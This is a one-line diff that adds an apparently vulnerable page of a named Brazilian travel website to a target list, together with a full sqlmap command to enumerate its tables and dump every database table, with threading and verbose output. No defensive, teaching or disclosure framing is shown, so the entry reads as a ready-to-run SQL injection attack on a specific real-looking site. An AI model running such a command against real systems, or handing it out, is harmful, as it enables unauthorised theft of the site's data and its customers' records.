@@ -1,0 +1,1 @@
+http://www.alunar.com.br/grupo_detalhe.php?cdviagem=25 (GET)  # sqlmap.py -u http://www.alunar.com.br/grupo_detalhe.php?cdviagem=25 -D alunar --tables --dump-all --threads 5 -v3
